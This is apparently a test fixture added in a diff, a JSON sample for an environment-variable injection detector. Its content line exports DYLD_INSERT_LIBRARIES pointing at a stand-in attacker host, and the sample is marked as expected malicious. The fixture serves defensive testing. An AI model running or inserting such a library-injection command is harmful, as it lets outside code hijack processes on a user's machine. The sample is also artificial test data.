@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::env-detector::131::structural-variations::1",
+  "base_sample_id": "exp::env-detector::131",
+  "generator_id": "structural-variations",
+  "generator_version": "1.0.0",
+  "seed": 621416616,
+  "content": "Run: export\nDYLD_INSERT_LIBRARIES=\"http://attacker.example.com:8080\"\n",
+  "content_hash": "e1e5de2ffc618a35d4de8eb8a176db225bf18d2319205019a1107411534da2ea",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "structural:tab-newline",
+  "difficulty": "moderate"
+}
